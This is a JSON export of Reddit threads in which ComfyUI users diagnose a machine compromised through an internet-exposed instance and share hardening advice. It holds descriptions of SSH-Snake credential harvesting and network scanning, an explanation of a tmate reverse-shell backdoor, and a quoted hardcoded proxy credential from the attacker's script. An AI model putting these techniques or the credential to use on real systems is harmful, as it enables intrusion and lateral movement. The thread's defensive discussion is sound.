                  "text": "Yes. You just mount the host folder when you run the container. Something like:\n\n`docker run -it -v ~/ComfyUI:/ComfyUI -gpus all --network=host --name comfyui name_of_container_image`\n\nWhere `~/ComfyUI` is the path to the ComfyUI folder in the host PC.\n\nIdeally you should start from a basic container image and build the environment yourself; that way you know exactly what was installed. The simplest way to do that for CUDA machines is to start with a nvidia/cuda docker image, say `13.1.1-cudnn-devel-ubuntu24.04`):\n\n`docker pull nvidia/cuda:13.1.1-cudnn-devel-ubuntu24.04`",
                  "score": 8,
                  "created_utc": "2026-01-26 09:13:43",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1yjz96",
                  "author": "WdPckr-007",
                  "text": "I run this in a compose like this\n\n    services:\n    \n      comfyui-nvidia:\n        image: <my registry url>/comfy:main-latest\n        container_name: comfyui-nvidia\n        restart: unless-stopped\n        deploy:\n          resources:\n            reservations:\n              devices:\n                - driver: nvidia\n                  count: all\n                  capabilities: [gpu]\n        volumes:\n          - /mnt/comfyui_checkpoints:/root/ComfyUI/models/checkpoints\n          - /mnt/comfyui_controlnet:/root/ComfyUI/models/controlnet\n          - /mnt/comfyui_inputs:/root/ComfyUI/input\n          - /mnt/comfyui_loras:/root/ComfyUI/models/loras\n          - /mnt/comfyui_outputs:/root/ComfyUI/output\n          - /mnt/comfyui_workflows:/root/ComfyUI/user/default/workflows\n          - /mnt/upscale_models:/root/ComfyUI/models/upscale_models\n          - /mnt/comfyui_custom_nodes:/root/ComfyUI/custom_nodes\n     \n        environment:\n          - NVIDIA_VISIBLE_DEVICES=all\n          - NVIDIA_DRIVER_CAPABILITIES=compute,utility\n    \n\n  \nhowever so nodes survive between container recreation i have to run a custom entrypoint in the image\n\n    #!/bin/bash\n    cd /root/ComfyUI\n    if [ -d \"custom_nodes\" ]; then\n        echo \"Checking for custom node requirements...\"\n        for dir in custom_nodes/*; do\n            if [ -d \"$dir\" ] && [ -f \"$dir/requirements.txt\" ]; then\n                echo \"Installing requirements for $(basename \"$dir\")...\"\n                pip3 install -r \"$dir/requirements.txt\"\n            fi\n        done\n    fi\n    \n    # Execute the passed command\n    exec \"$@\"",
                  "score": 1,
                  "created_utc": "2026-01-27 04:32:07",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1t6vgr",
              "author": "Lightningstormz",
              "text": "Does a virtual environment like miniconda environments add any similar level of protection like docker?",
              "score": 2,
              "created_utc": "2026-01-26 12:58:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1towwk",
                  "author": "Antique_Juggernaut_7",
                  "text": "Nope. A container isolates everything -- OS, files, even memory -- from the host. A python environment is only a selection of which libraries to count as installed.",
                  "score": 3,
                  "created_utc": "2026-01-26 14:36:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1robwp",
              "author": "WdPckr-007",
              "text": "I have been there just a fair advance on that path, if you use amd forget about containers its always 80% slower for some reason\n\nNvidia cont is as fast as in the host",
              "score": 2,
              "created_utc": "2026-01-26 05:31:03",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sfhch",
                  "author": "Antique_Juggernaut_7",
                  "text": "Oh wow. I never deployed on AMD but I'd bet heavily that there is an issue with the docker image being used. Have you tried installing the environment from scratch?",
                  "score": 1,
                  "created_utc": "2026-01-26 09:15:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1w5tnw",
              "author": "superstarbootlegs",
              "text": "great, but then lowVRAM has two more layers to go through before it can function, and it will slow it down. I'm sure there are plenty of ways WSL2 and Docker can also go badly in this context too.",
              "score": 1,
              "created_utc": "2026-01-26 21:04:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1wkiyp",
                  "author": "Antique_Juggernaut_7",
                  "text": "That's not exactly how this works. The overhead should be straightforward and small, largely CPU-bound related to OS-level calls. Containerization should not touch the GPU at all (beyond using whatever libraries you installed in the container).\n\nIn fact I'd argue it is quite possible that containerization *improves* GPU use as you are dealing with a lot less driver/library bloat than you would if you're using the host machine directly for everything you do.\n\nYou are right in the sense that, in WSL2, there are a few strange issues that stem out of the emulated Linux environment. For example, there is a weird cap on RAM speed that come from the way WSL2 works. But you can essentially the same WSL2 performance with a docker container inside it.",
                  "score": 2,
                  "created_utc": "2026-01-26 22:10:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1s6m46",
          "author": "GrapplingHobbit",
          "text": "What's the confidence level in it being the easy-use nodes?  That's a pretty popular and well-starred repository.",
          "score": 21,
          "created_utc": "2026-01-26 07:55:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sds13",
              "author": "shroddy",
              "text": "From what is known right now, easy-use is \"only\" vulnerable when the comfyui instance is accessible online, which is probably true for many custom nodes because the 's' in comfyui stands for security.¬†\n\n\nIf there is really malware present in easy-use, we can consider the comfyui node ecosystem as failed, as even \"only use well known nodes by trusted developers\" no longer cuts it.¬†",
              "score": 19,
              "created_utc": "2026-01-26 08:59:37",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1so5k5",
                  "author": "lumpxt",
                  "text": "It's not the node ecosystem that failed, it's \"very simplified remote access without any reliable auth layer and having disabled network protection layers\" that was the issue.",
                  "score": 9,
                  "created_utc": "2026-01-26 10:34:33",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1svq2m",
                  "author": "SearchTricky7875",
                  "text": "I doubt it is easy-use node, if there is any vulnerability,  it would have been flagged early by many developers, as OP is using claude code, the agent either installed some malware or modified the 'easy-use' code to customize it, there comes the vibe code horror, without understanding what the agent is doing can be a nightmare.",
                  "score": 6,
                  "created_utc": "2026-01-26 11:38:39",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1roucu",
          "author": "Tam1",
          "text": "Some more info for you on SSH Snake and what else it might have scanned and found:\nBash History:\tParses ~/.bash_history for previous ssh, scp, or rsync commands to find usernames and IPs.\nSSH Configs\t:Reads ~/.ssh/config to find host aliases and specific IdentityFile paths.\nNetwork Discovery:\tUses ip neigh (ARP) and getent to find other active devices on the local network.\nD-Block Scan:\tIf configured, it will \"fuzz\" the last octet of the current IP (e.g., 192.168.1.0-255) to find live hosts.\nHashed Hosts:\tIt even tries to crack/brute-force hashed entries in known_hosts by comparing them against discovered IPs.\n\nOn top of that the script is essentially fileless. It exists in memory (as a variable) and moves through SSH pipes without needing to be written to a permanent file on the target machine in many configurations. This means looking at file modifications alone may not help you chart the attack path. \n\nDo you have Defender running?\n\nThAat tmux script has hard coded credentials in it too: i76qPr:Lt1t3TZZhR, which means the person who wrote this is probably using a specific, private proxy infrastructure to \"tunnel\" out of your network and its running with -d to make it a hidden background session too so spotting if its active will be a challenge. \n\nWould be good to get a full list of all your nodes or extensions asap.",
          "score": 15,
          "created_utc": "2026-01-26 05:34:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1r7d21",
          "author": "nvmax",
          "text": "Here is the breakdown of what is happening:\n\n1. What is tmate?\ntmate is an open-source tool that creates a \"terminal sharing\" session. It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n‚úÖ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",
          "score": 36,
          "created_utc": "2026-01-26 03:42:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r8s5z",
              "author": "digiden",
              "text": "Is there a way to disable terminal sharing?",
              "score": 4,
              "created_utc": "2026-01-26 03:50:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1rbikw",
                  "author": "nvmax",
                  "text": "usually these types of packages are malware and have multiple points of intrusion the best way disconnect from the internet entirely on that pc.. all your data, logins, passwords are probably being stolen as you sit there typing on it.",
                  "score": 10,
                  "created_utc": "2026-01-26 04:06:59",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rbyxi",
                  "author": "guchdog",
                  "text": "Even if this is all true, this mean anything could have been ran and installed.  Removing it solves the security issue but they could have installed virus, malware, spyware, ransomware, whatever.",
                  "score": 11,
                  "created_utc": "2026-01-26 04:09:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1w8441",
              "author": "superstarbootlegs",
              "text": "this is the way. and check all your backups and totally wipe whatever you have to. ruthlessly. and figure out when it got in because you need to get that thing out of your life and it might require a fair bit of forensics to achieve that and not have it show up when you accidently load it up again in a years time from previous work.",
              "score": 1,
              "created_utc": "2026-01-26 21:14:50",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ul6wy",
          "author": "Violent_Walrus",
          "text": "So you exposed your system to the public internet and then it got compromised? Shocking.",
          "score": 6,
          "created_utc": "2026-01-26 17:00:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1s1qmy",
          "author": "SearchTricky7875",
          "text": "please dont install any custom node using claude code or any vibe coding tool, first check the custom node rating , popularity then only do install manually. I was victim of this, claude code just installed any node on my system, which someone created only to mine your gpu, there are many mining code spreading all accross github, claude code doesn't check for git stars n popularity, it matches the name n install it, it could be some mining code for sure, popular nodes are safe generally.\n\nI had a bad experience with claude code and last next js vulnerability, it istalled some code and my whole server was down with mining code, I delete one maware, it again got installed, the malware make copies in so many places you ll waste your days figuring it out where it existed, almost after 3 days I had to take backup n reinstall the whole server.",
          "score": 11,
          "created_utc": "2026-01-26 07:14:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1si7z8",
          "author": "GasolinePizza",
          "text": "OP, you should probably edit your post, where it's calling out easy-use, to point out the actual issue was giving free access to your ComfyUI to the whole internet. There are a variety of ways to exploit your machine with full ComfyUI access, no easy-use required... especially since that implies they could open up manager and install almost any set of custom nodes on the registry (unless you've manually lowered the security level)\n\nBut now people are in the comments spreading a panic about easy-use being compromised instead.",
          "score": 13,
          "created_utc": "2026-01-26 09:40:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sqfx6",
              "author": "AssistBorn4589",
              "text": "> actual issue was giving free access to your ComfyUI to the whole internet\n\nThanks to pointing that out, I was really nervous here for short moment.",
              "score": 7,
              "created_utc": "2026-01-26 10:54:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1snlmg",
          "author": "Clasyc",
          "text": "If you opened your port to the public, the security risk might not come from ComfyUI itself or its nodes, but from the underlying server it runs on‚Äîspecifically the Python library \\`aiohttp\\`. If \\`aiohttp\\` has unpatched vulnerabilities, exposing your server publicly allows attackers to exploit those vulnerabilities to gain unauthorized access or execute malicious code on your machine. Additionally, any other ports you open to other software also become potential attack vectors. So blaming comfyui-easy-use in this specific case seems strange unless you can pinpoint the exact commit where that vulnerability was introduced.",
          "score": 4,
          "created_utc": "2026-01-26 10:29:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1wallt",
              "author": "Carnildo",
              "text": "The fact that the malware starts printing immediately after ComfyUI prints \"got prompt\" suggests that the OP's using a node that permits code injection through the prompt, rather than it being a lower-level vulnerability.",
              "score": 2,
              "created_utc": "2026-01-26 21:25:47",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1uxrnt",
          "author": "_mayuk",
          "text": "Lol as soon I saw your post I knew that you had the flag  ‚Äîlisten and your ports open lol",
          "score": 3,
          "created_utc": "2026-01-26 17:55:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1swxb6",
          "author": "mdmachine",
          "text": "Use something like tailscale, better yet docker, even better both.\n\nAnother layer you can utilize is a 5g router (for example) behind a CGNAT. \n\nSeems it is a open port scanner? Node might not even be relevant? \n\nAnd DMZ is a BIG ASS NO-NO!!! Jeez!",
          "score": 3,
          "created_utc": "2026-01-26 11:48:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wcm4g",
          "author": "artificial-artistry",
          "text": "rgthree has said in his repo that he doesn‚Äôt trust EasyUse repo. Not saying it‚Äôs not on you OP, but it‚Äôs true that some experts don‚Äôt go by just stars alone",
          "score": 3,
          "created_utc": "2026-01-26 21:34:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wfv6d",
          "author": "superstarbootlegs",
          "text": "So, opened yourself up to the internet and let everyone have a go on your machine. You should probably update that a bit more clearly there, but at least you/we now know this wasnt ComfyUI, I guess.",
          "score": 3,
          "created_utc": "2026-01-26 21:49:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sebba",
          "author": "intermundia",
          "text": "Have you reported it to the comfy team?",
          "score": 4,
          "created_utc": "2026-01-26 09:04:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sqhpn",
          "author": "Simonos_Ogdenos",
          "text": "Sorry to hear that OP, comfy is defining not ‚Äòsafe‚Äô and needs some rules of thumb applying to ensure you don‚Äôt fall foul to a bad node, shame to learn the hard way. \nI dropped the easy-use repo into ChatGPT (paid) and had it check the whole codebase, it didn‚Äôt find anything of major concern, although there is some stuff there that may raise a few eyebrows including the use of BiziAir, which has been mentioned before but nothing specific to malware, crypto miners etc. \nI also ran some checks on my own system (process inspection, memory and cpu behaviour, outbound firewall, live network capture and active socket verification), both historically and whilst comfy was running, again no evidence of foul play on my system (I have easy-use installed). Take this with a pinch of salt and it‚Äôs not a confirmation that it‚Äôs definitely a safe node. My rig is Linux headless, UFW capped to local only unless I manually disable temporarily for updates (I have a script for it), comfy bound to LAN only, and belt and braces all ports on my router are closed with only reverse proxy and headscale for my own inbound connectivity when out and about, so almost zero chance anyone is getting in, so my checks might not flag something that would appear on a less secure system.",
          "score": 4,
          "created_utc": "2026-01-26 10:54:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1suftb",
          "author": "i-eat-kittens",
          "text": "If you're going to access your PC/LAN from the internet, you need to run a vpn. The best option is [wireguard](https://www.wireguard.com/).\n\nPlacing your desktop in a DMZ is just asking to be hacked.",
          "score": 5,
          "created_utc": "2026-01-26 11:28:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v9yee",
              "author": "TechnologyGrouchy679",
              "text": "Word!  I use Tailscale (built on top of WireGuard)",
              "score": 0,
              "created_utc": "2026-01-26 18:46:05",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rt2wy",
          "author": "prowacko",
          "text": "So you're saying having comfyui\\_easy-use in general was the cause for this? A lot of people have this node so wouldn't this be a wide spread issue? Or was it solely because you opened your ports and enabling DMZ?",
          "score": 6,
          "created_utc": "2026-01-26 06:05:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rtknm",
              "author": "Bender1012",
              "text": "Combination of all 3. If you do not use the --listen flag and do not forward your comfyui port / DMZ host your PC, you should be fine.",
              "score": 10,
              "created_utc": "2026-01-26 06:09:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1sgzrl",
                  "author": "Aggressive-Bother470",
                  "text": "Why were you using dmz host?¬†",
                  "score": 4,
                  "created_utc": "2026-01-26 09:29:28",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ruro4",
                  "author": "ChromaBroma",
                  "text": "But is it node infected? I'm trying to determine if I should remove it.",
                  "score": 2,
                  "created_utc": "2026-01-26 06:18:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1sazgk",
          "author": "ThinkingWithPortal",
          "text": "This is really bad. I'm not on a DMZ, but I am on containers and Nginx Proxy Manager so safer but still concerning... thanks for the heads up on this.",
          "score": 2,
          "created_utc": "2026-01-26 08:34:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vu1ob",
          "author": "alexmizell",
          "text": "The problem here is not comfy ui it's that you defeated your own firewall.  It's likely that there are other vulnerable apps on your computer that could also be exploited. when hackers are given this much surface area to work with they will nearly always find something.",
          "score": 2,
          "created_utc": "2026-01-26 20:12:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1w6nan",
              "author": "Bender1012",
              "text": "Indeed",
              "score": 0,
              "created_utc": "2026-01-26 21:08:18",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o27tbdr",
          "author": "rsoult3",
          "text": "I hope the damage was minimal. If you would like to check on progress with your phone, I would suggest running a local VPN server. I run WireGuard. The only open port on my router is to the WireGuard server. Once connected to the VPN from my phone or laptop, I can only access machines on my internal network that are also running a WireGuard client.  \nSo while my internal IPs are 192.168.\\*.\\*, the WireGuard IPs are 10.0.0.\\*.\n\nWhat is cool, is that friends I have allowed a connection to the VPN, also behave like we are all on a local LAN. This allows for LAN games with games that don't have internet play.\n\nI started doing this when I noticed hundreds of thousands of attempts to connect to my Remote Desktop.  \n  \nMany people are just scanning the internet looking for victims. Be safe out there.",
          "score": 2,
          "created_utc": "2026-01-28 14:11:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rn1o3",
          "author": "oasuke",
          "text": "Why would an attacker post their messages in the terminal for the user to see lol. Vibe coded malware?",
          "score": 4,
          "created_utc": "2026-01-26 05:22:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s12v0",
              "author": "Carnildo",
              "text": "No, the expected use for this malware is for when an attacker has managed to get a shell on a machine and is looking to expand their foothold.  The messages are intended to be displayed to the attacker, not the victim.\n\nIn the OP's case, they're being targeted by blind injection -- the attacker is running commands with the intention of eventually exfiltrating data or getting a remote shell, but can't see what's actually happening on the victim's machine.",
              "score": 8,
              "created_utc": "2026-01-26 07:08:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s27p8",
                  "author": "Bender1012",
                  "text": "Yes, I was saved by some of the command outputs being displayed directly in my ComfyUI terminal which is how I knew something was wrong. I later had to check my bash history which showed me the full extent of what commands the attacker did.",
                  "score": 3,
                  "created_utc": "2026-01-26 07:18:19",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1sh3yq",
              "author": "Aggressive-Bother470",
              "text": "Didn't unset histfile either.¬†",
              "score": 1,
              "created_utc": "2026-01-26 09:30:35",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1s3z97",
              "author": "ANR2ME",
              "text": "A kind attacker may be üòÅ",
              "score": 1,
              "created_utc": "2026-01-26 07:33:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1s1upq",
          "author": "cypherx89",
          "text": "Oof that‚Äôs suxs man did  u also run comfy as administrator ? , fyi if you want to setup remote access use witeguard or something to tunnel traffic. Dont fully expose via DMZ host mode.",
          "score": 2,
          "created_utc": "2026-01-26 07:15:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rx3hs",
          "author": "Jealous_Piece_1703",
          "text": "Dear god not Easy use! Gotta check my system now!",
          "score": 3,
          "created_utc": "2026-01-26 06:36:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sfkty",
              "author": "Carnildo",
              "text": "The problem isn't Easy-Use, it's the combination of \"--listen\" plus the router DMZ setting.  That lets anyone on the internet play around with your installation of ComfyUI.",
              "score": 10,
              "created_utc": "2026-01-26 09:16:17",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1vr3ky",
              "author": "Kinsiinoo",
              "text": "There is nothing wrong with the easy-use node. The root cause was the --listen flag not correctly used by OP.",
              "score": 2,
              "created_utc": "2026-01-26 19:59:19",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1s4q4j",
              "author": "S7venE11even",
              "text": "Let us know if you find something please.",
              "score": 3,
              "created_utc": "2026-01-26 07:39:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sak0w",
                  "author": "Jealous_Piece_1703",
                  "text": "I have old versions, did not update it, And no there is nothing sus happening from it in my old version.",
                  "score": 2,
                  "created_utc": "2026-01-26 08:30:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1t9rnn",
          "author": "jib_reddit",
          "text": "Judt turning --listen is a well know and huge security theat, thats why it is off by default.",
          "score": 1,
          "created_utc": "2026-01-26 13:15:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1tahxo",
              "author": "ResponsibleTruck4717",
              "text": "Don't we need to use --listen when running it inside container?  \nI'm asking since my experience with docker is quite limited I run comfyui on sand box, in other words I'm asking to learn.",
              "score": 2,
              "created_utc": "2026-01-26 13:20:18",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1v0wbj",
                  "author": "Zangwuz",
                  "text": "Yes there is several cases where we need to use the --listen flag but the issue with op is not just the --listen flag but the fact that he had DMZ host enabled without any restriction apparently. There is people out there that scan ip address + port randomly. And if you keep the default port, 8188 here, you make it easier for them.",
                  "score": 2,
                  "created_utc": "2026-01-26 18:08:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ua0vj",
          "author": "dllm0604",
          "text": "Unrelated to Comfy, a thing to consider doing is to only have SSH private keys in TPM, Windows Hello, or Secure Enclave. It‚Äôs not difficult to do anymore.",
          "score": 1,
          "created_utc": "2026-01-26 16:12:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1uuzr1",
          "author": "pfn0",
          "text": "ssh tunnel, port forward. problem solved. (use pki for ssh only, no passwords, secure your keys). putting your comfyui out in the public is asking for it to be abused, anyone could run any generation or workflow they want on your setup.",
          "score": 1,
          "created_utc": "2026-01-26 17:42:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rnhyd",
          "author": "lundrog",
          "text": "Yikes",
          "score": 1,
          "created_utc": "2026-01-26 05:25:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sl087",
          "author": "GraftingRayman",
          "text": "One question I have, did you install the comfy-easy-use nodes via the manager or a git clone manually?\n\nWondering if it was a forked version that has dodgy code",
          "score": 0,
          "created_utc": "2026-01-26 10:06:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1t2nc3",
          "author": "cicoles",
          "text": "Wow that is scary. I realized that ComfyUI was getting too bloated and complex and vibe coded an image generator that has all the features I want in image gen in a weekend.\n\nI think as time goes by, people will be using their own vibe coded solutions.",
          "score": -1,
          "created_utc": "2026-01-26 12:30:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21177e",
              "author": "bCasa_D",
              "text": "Security is one of the biggest problems with vibe coding, that will just make things worse if you don‚Äôt know what you‚Äôre doing.",
              "score": 1,
              "created_utc": "2026-01-27 15:15:26",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o24gb9l",
                  "author": "Sudden-Mastodon-8518",
                  "text": "It's only true if you are totally clueless.",
                  "score": 1,
                  "created_utc": "2026-01-28 00:32:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vplxa",
          "author": "addrainer",
          "text": "So did you locate the trouble causing custom node?",
          "score": 0,
          "created_utc": "2026-01-26 19:52:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wk8dn",
          "author": "tequiila",
          "text": "**can never trust** [**comfyui-easy-use**](https://github.com/yolain/ComfyUI-Easy-Use)**. a while back someone put his face on one of the nodes so his (or someones) face comes up on every generation you do.**",
          "score": 0,
          "created_utc": "2026-01-26 22:08:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1teuen",
          "author": "Then_Gas712",
          "text": "Oh, very bad indeed... but which country are you?",
          "score": -2,
          "created_utc": "2026-01-26 13:44:34",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qp3svd",
      "title": "VNCCS Pose Studio: Ultimate Character Control in ComfyUI",
      "subreddit": "comfyui",
      "url": "https://www.youtube.com/watch?v=YYclB6414nw",
      "author": "AHEKOT",
      "created_utc": "2026-01-28 06:32:26",
      "score": 211,
      "num_comments": 69,
      "upvote_ratio": 0.99,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qp3svd/vnccs_pose_studio_ultimate_character_control_in/",
      "domain": "youtube.com",
      "is_self": false,
      "comments": [
        {
          "id": "o26cz1s",
          "author": "Snoo20140",
          "text": "NOTE: Comfy Manager hasn't been updated to the correct Github (it won't be a comfyUI\\_name) so it will error if you try using manager at the time of this comment.\n\nEDIT: VNCCS\\_QWEN\\_Encoder doesn't seem to load correctly with either the Manager install version or the Github version. Unless i'm doing something wrong.\n\nEDIT 2: The Encoder is part of the ComfyUI\\_VNCCS repo.",
          "score": 11,
          "created_utc": "2026-01-28 07:36:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o288nnr",
              "author": "dirtybeagles",
              "text": "the encoder is in the [**VNCCS - Visual Novel Character Creation Suite**](https://github.com/AHEKOT/ComfyUI_VNCCS) **node, if you install it that should fix your issue with that.**",
              "score": 3,
              "created_utc": "2026-01-28 15:26:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o298f6m",
                  "author": "Snoo20140",
                  "text": "Any chance u can upload FBX files to ur viewer? Export an animation as a series of images?",
                  "score": 1,
                  "created_utc": "2026-01-28 18:01:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o26lqaj",
          "author": "Cute_Ad8981",
          "text": "Does this only work with qwen? Or can i use other models like sdxl?",
          "score": 3,
          "created_utc": "2026-01-28 08:54:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26lv7n",
              "author": "AHEKOT",
              "text": "Lora is only for qwen now. But it can work with any controlnet on any model without this lora.",
              "score": 4,
              "created_utc": "2026-01-28 08:56:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o28lcl2",
          "author": "Vivid-Loss9868",
          "text": "https://preview.redd.it/ogkr9vde84gg1.png?width=1920&format=png&auto=webp&s=351dc66d75ec8e3cc05b3c4f4cc3074553d048a2\n\nlove it! great work, any change we can get a lock in the visual pose studio editor, like lock the image and the pose.bit messy if you pass a lot of time tweaking then you mess up.",
          "score": 3,
          "created_utc": "2026-01-28 16:21:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o26msom",
          "author": "Ok-Worldliness-9323",
          "text": "not working with klein right?",
          "score": 2,
          "created_utc": "2026-01-28 09:04:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26mzt6",
              "author": "AHEKOT",
              "text": "Should work with controlnet preprocessing. Add openpose and depth from node model, and connect prompt.",
              "score": 2,
              "created_utc": "2026-01-28 09:06:35",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o26prok",
          "author": "SirToki",
          "text": "Is there a way to infer the pose from an image, so you don't have to set it up yourself?",
          "score": 2,
          "created_utc": "2026-01-28 09:32:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26pufv",
              "author": "AHEKOT",
              "text": "Not for now. It's harder then looks.",
              "score": 3,
              "created_utc": "2026-01-28 09:33:31",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o26q9lm",
                  "author": "SirToki",
                  "text": "Sorry, I wasn't trying to imply it is easy. Thanks for the answer.",
                  "score": 1,
                  "created_utc": "2026-01-28 09:37:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o27g94n",
              "author": "Synor",
              "text": "https://duckduckgo.com/?q=comfyui+openpose+estimate",
              "score": 1,
              "created_utc": "2026-01-28 13:00:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o29s9wy",
          "author": "Far-Map1680",
          "text": "This is amazing my friend! Ive been waiting for a tool like this! Bless you.",
          "score": 2,
          "created_utc": "2026-01-28 19:27:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2c4qfe",
          "author": "Frogy_mcfrogyface",
          "text": "Sweet!",
          "score": 2,
          "created_utc": "2026-01-29 02:16:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2fq0ks",
          "author": "Prediccion",
          "text": "thanks, i was struggling with qwen and some poses, thanks to this i dont lose time and i directly get what i want withouth so much try and fail, and time lose.",
          "score": 2,
          "created_utc": "2026-01-29 16:32:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o26kcpd",
          "author": "Synor",
          "text": "There is a bug in your Pose and Emotion Studio nodes, they layout-wise keep growing vertically to infinity. Making them unusable. (Firefox and Safari)",
          "score": 1,
          "created_utc": "2026-01-28 08:42:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o26kksl",
              "author": "AHEKOT",
              "text": "It's in main VNCCS project, not this one? Would be cool if you can attach screenshot here.",
              "score": 1,
              "created_utc": "2026-01-28 08:44:28",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o26l5e8",
                  "author": "Synor",
                  "text": "Both projects are affected.\n\nThere is also an issue with your Pose Studio node making http requests to huggingface continously.\n\nHTTP Request: HEAD https://huggingface.co/MIUProject/VNCCS_PoseStudio/resolve/main/model_updater.json \"HTTP/1.1 307 Temporary Redirect\"\n\nHTTP Request: HEAD https://huggingface.co/api/resolve-cache/models/MIUProject/VNCCS_PoseStudio/c8441457da7010724da2e343724336ba4c195ec3/model_updater.json \"HTTP/1.1 200 OK\"",
                  "score": 1,
                  "created_utc": "2026-01-28 08:49:43",
                  "is_submitter": false,
                  "replies": []
                }
